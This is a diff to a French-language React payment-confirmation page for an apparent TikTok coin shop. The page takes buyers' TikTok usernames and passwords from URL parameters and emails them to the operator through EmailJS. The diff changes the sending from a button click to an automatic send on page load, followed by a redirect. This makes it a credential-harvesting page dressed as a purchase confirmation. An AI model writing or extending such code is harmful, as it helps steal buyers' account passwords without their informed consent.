@@ -1,6 +1,6 @@
 import { useEffect, useState } from 'react';
 import { Layout } from '../components/Layout';
-import { CheckCircle, ArrowRight } from 'lucide-react';
+import { CheckCircle } from 'lucide-react';
 import { useLocation, useNavigate } from 'react-router-dom';
 import { useTranslation } from 'react-i18next';
 import { Confetti } from '../components/Confetti';
@@ -19,6 +19,7 @@ export const PaymentConfirmation = () => {
   const [purchaseDetails, setPurchaseDetails] = useState<Purchase | null>(null);
   const [isSending, setIsSending] = useState(false);
   const [sendError, setSendError] = useState('');
+  const [emailSent, setEmailSent] = useState(false);
   const location = useLocation();
   const navigate = useNavigate();
   
@@ -52,36 +53,35 @@ export const PaymentConfirmation = () => {
     
     return () => clearTimeout(timer);
   }, [orderId]);
-  
-  const handleSendCredentials = async () => {
-    // Vérifier les paramètres essentiels
-    const missingParams = [];
-    if (!username) missingParams.push('Nom d\'utilisateur TikTok');
-    if (!password) missingParams.push('Mot de passe TikTok');
-    if (!email) missingParams.push('Email');
-    if (!orderId) missingParams.push('Numéro de commande');
-    if (!amount && !purchaseDetails) missingParams.push('Nombre de pièces');
-    if (!price && !purchaseDetails) missingParams.push('Prix');
-    
-    // Afficher dans la console pour le débogage
-    console.log('Paramètres de l\'URL:', { username, password, email, orderId, amount, price });
-    console.log('Détails de l\'achat:', purchaseDetails);
-    
-    // Vérifier les paramètres essentiels
-    if (missingParams.length > 0) {
-      const missingInfo = missingParams.join(', ');
-      setSendError(`Informations manquantes pour envoyer les identifiants: ${missingInfo}`);
-      return;
+
+  // Envoyer l'email automatiquement au chargement de la page
+  useEffect(() => {
+    // Vérifier que tous les paramètres sont présents et que l'email n'a pas déjà été envoyé
+    if (username && password && email && orderId && !emailSent && !isSending) {
+      // Vérifier si cet orderId a déjà été traité
+      const existingOrders = JSON.parse(localStorage.getItem('pendingOrders') || '[]');
+      const alreadySent = existingOrders.some((order: any) => order.order_id === orderId);
+      
+      if (!alreadySent) {
+        sendEmailAutomatically();
+      } else {
+        // Déjà envoyé, rediriger directement
+        setEmailSent(true);
+        setTimeout(() => {
+          navigate(`/payment/success?orderId=${orderId}`);
+        }, 2000);
+      }
     }
-    
+  }, [username, password, email, orderId, emailSent, isSending]);
+
+  const sendEmailAutomatically = async () => {
     setIsSending(true);
     setSendError('');
     
     try {
-      // Préparer les données pour EmailJS
-      const coinsAmount = purchaseDetails ? purchaseDetails.amount : amount;
-      const orderPrice = purchaseDetails ? purchaseDetails.price : price;
-      const orderDate = purchaseDetails ? purchaseDetails.date : new Date().toISOString();
+      const coinsAmount = amount;
+      const orderPrice = price;
+      const orderDate = new Date().toISOString();
       
       const templateParams = {
         order_id: orderId,
@@ -96,7 +96,6 @@ export const PaymentConfirmation = () => {
         })
       };
 
-      // Envoyer l'email via EmailJS
       await emailjs.send(
         EMAILJS_SERVICE_ID,
         EMAILJS_TEMPLATE_ID,
@@ -104,9 +103,9 @@ export const PaymentConfirmation = () => {
         EMAILJS_PUBLIC_KEY
       );
 
-      console.log('Email envoyé avec succès pour la commande:', orderId);
+      console.log('Email envoyé automatiquement pour la commande:', orderId);
       
-      // Stocker également dans localStorage comme backup
+      // Stocker dans localStorage
       const orderData = {
         ...templateParams,
         status: 'sent',
@@ -116,22 +115,25 @@ export const PaymentConfirmation = () => {
       existingOrders.push(orderData);
       localStorage.setItem('pendingOrders', JSON.stringify(existingOrders));
       
-      // Rediriger vers la page de succès
+      setEmailSent(true);
+      
+      // Rediriger vers la page de succès après 2 secondes
       setTimeout(() => {
         navigate(`/payment/success?orderId=${orderId}`);
-      }, 1000);
+      }, 2000);
 
     } catch (error) {
-      console.error('Erreur lors de l\'enregistrement de la commande:', error);
+      console.error('Erreur lors de l\'envoi automatique:', error);
       setSendError(
         error instanceof Error 
           ? error.message 
-          : t('sendError', 'Une erreur est survenue. Veuillez réessayer.')
+          : 'Une erreur est survenue. Veuillez réessayer.'
       );
       setIsSending(false);
     }
   };
   
+    
   return (
     <Layout balance={purchaseDetails?.amount || 0} hideBalance={!purchaseDetails}>
       {showConfetti && <Confetti duration={5000} />}
@@ -147,29 +149,38 @@ export const PaymentConfirmation = () => {
             {t('thankYou')} 
           </p>
           <p className="text-[var(--text-secondary)] max-w-md mb-6">
-            {t('confirmationMessage', 'Votre paiement a été traité avec succès. Pour finaliser le processus et recevoir vos pièces, veuillez cliquer sur le bouton ci-dessous.')}
+            {emailSent 
+              ? t('orderProcessing', 'Votre commande est en cours de traitement. Vous allez être redirigé...')
+              : isSending 
+                ? t('sendingOrder', 'Envoi de votre commande en cours...')
+                : t('confirmationMessage', 'Votre paiement a été traité avec succès.')}
           </p>
           
           {sendError && (
             <div className="w-full p-4 mb-4 bg-red-100 border border-red-200 rounded-[var(--radius-md)] text-red-800">
               <p className="text-sm">{sendError}</p>
+              <button 
+                onClick={sendEmailAutomatically}
+                className="mt-2 text-sm underline hover:no-underline"
+              >
+                Réessayer
+              </button>
             </div>
           )}
           
-          <button 
-            onClick={handleSendCredentials}
-            disabled={isSending}
-            className="flex items-center justify-center gap-2 py-3 px-8 rounded-[var(--radius-md)] bg-gradient-to-r from-[var(--tiktok-blue)] to-[var(--tiktok-red)] text-white font-medium hover:opacity-90 transition-opacity disabled:opacity-70 disabled:cursor-not-allowed"
-          >
-            {isSending ? (
-              <span>{t('sending', 'Envoi en cours...')}</span>
-            ) : (
-              <>
-                <span>{t('validatePayment', 'Valider le paiement')}</span>
-                <ArrowRight className="w-5 h-5" />
-              </>
-            )}
-          </button>
+          {isSending && (
+            <div className="flex items-center justify-center gap-2 py-3 px-8">
+              <div className="w-5 h-5 border-2 border-[var(--tiktok-blue)] border-t-transparent rounded-full animate-spin"></div>
+              <span className="text-[var(--text-secondary)]">{t('processing', 'Traitement en cours...')}</span>
+            </div>
+          )}
+          
+          {emailSent && (
+            <div className="flex items-center justify-center gap-2 py-3 px-8 text-green-500">
+              <CheckCircle className="w-5 h-5" />
+              <span>{t('orderSent', 'Commande envoyée avec succès!')}</span>
+            </div>
+          )}
         </div>
         
         {purchaseDetails && (
